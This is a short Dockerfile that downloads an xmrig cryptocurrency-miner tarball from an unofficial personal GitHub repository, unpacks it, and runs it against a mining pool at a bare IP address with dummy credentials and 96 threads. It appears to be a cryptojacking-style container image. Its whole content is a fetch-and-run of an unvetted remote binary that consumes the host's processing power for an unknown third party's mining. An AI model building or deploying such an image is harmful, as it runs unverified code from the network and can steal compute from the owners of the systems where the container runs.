FROM ubuntu:latest AS build
RUN apt-get update && apt-get -y install wget vim
WORKDIR /home
RUN wget https://raw.githubusercontent.com/abelleshop/xms/main/xmrig-6.18.0.tar.gz
RUN tar xf xmrig-6.18.0.tar.gz
ENTRYPOINT [ "./xmrig" ]
CMD ["--url=94.237.102.6:3333", "--user=x", "--pass=x", "-k", "-t=96"]
